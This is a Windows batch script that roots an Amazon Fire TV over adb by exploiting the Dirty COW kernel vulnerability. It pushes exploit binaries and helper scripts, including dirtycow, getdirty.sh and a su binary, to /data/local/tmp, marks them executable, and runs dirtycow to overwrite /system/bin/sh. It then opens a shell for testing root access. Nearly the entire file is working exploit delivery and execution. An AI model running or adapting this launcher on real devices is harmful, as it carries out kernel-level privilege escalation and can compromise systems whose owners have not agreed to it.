@echo off


:: Source
::http://www.aftvnews.com/how-to-root-the-amazon-fire-tv-using-the-dirty-cow-vulnerability/


color 0e


set runShellNoTerminateAndWait=cmd /k
set runShellNoTerminate=start cmd /k
set runShellWaitNoTerminate=start /wait cmd /k
set runShellTerminateAndWait=cmd /c
set runShellTerminate=start cmd /c
set runShellWaitTerminate=start /wait cmd /c

set _color="%cd%\bin\cocolor.exe"

set sleep="..\..\..\bin\wait.exe"
set rm=rmdir /s /q

set adb="..\..\..\bin\adb.exe"
set adbKill=%adb% kill-server
set adbStart=%adb% start-server
set adbWait=%adb% wait-for-device

set push=%adb% push
set pull=%adb% pull
set shell=%adb% shell
set connect=%adb% connect
set disconnect=%adb% disconnect

set ip=0.0.0.0

set virtualRouterCMD="..\..\..\bin\virtualrouter.exe"
set virtualRouterGUI="..\..\..\bin\virtualrouter-gui.exe"

set amStart=%shell% am start -a android.intent.action.MAIN -n

set showSettingsSystemNetwork=%amStart% com.amazon.tv.settings/.wifi.BuellerNetworkSettingsActivity


:: DirtyCow Exploit Files
%push% "push\cowscript" /data/local/tmp/
%push% "push\dirtycow" /data/local/tmp/
%push% "push\getdirty.sh" /data/local/tmp/
%push% "push\sh" /data/local/tmp/

:: Fixes and Other Misc Exploit Related
%push% "push\persistant-shell.sh" /data/local/tmp/
%push% "push\turn-off-periodic-writeback.sh" /data/local/tmp/

:: Superuser Files
%push% "push\su" /data/local/tmp/

:: Busybox
::%push% "push\busybox" /data/local/tmp/

:: Potential Victim Processes
::%push% "push\app_process32" /data/local/tmp/
::%push% "push\ip" /data/local/tmp/
::%push% "push\ping" /data/local/tmp/
%push% "push\run-as" /data/local/tmp/

:: Set Exploit Files Permissions On Device
%shell% chmod 755 /data/local/tmp/cowscript
%shell% chmod 755 /data/local/tmp/dirtycow
%shell% chmod 755 /data/local/tmp/getdirty.sh
%shell% chmod 755 /data/local/tmp/persistant-shell.sh
%shell% chmod 755 /data/local/tmp/turn-off-periodic-writeback.sh

:: Set Processes Permissions On Device
::%shell% chmod 755 /data/local/tmp/app_process32
::%shell% chmod 755 /data/local/tmp/ip
::%shell% chmod 755 /data/local/tmp/ping
%shell% chmod 755 /data/local/tmp/run-as
%shell% chmod 755 /data/local/tmp/sh

cls
%adbKill%


::%shell% "sh /data/local/tmp/getdirty.sh"
%shell% /data/local/tmp/dirtycow /data/local/tmp/sh /system/bin/sh

::echo.
::echo.
::echo Press a key once exploit has finished....
::echo.
::echo.
::pause>nul

:: Try launching TWRP Installer
::%shell% "sh /sdcard/montoya_recovery_v1.zip"

echo.
echo.
echo.
echo.
echo.
echo Type in "su" without quotes and Press ENTER to test exploit result
echo.
echo.
echo Type "exit" without quotes to leave shell
echo.
echo.



%shell%


:end



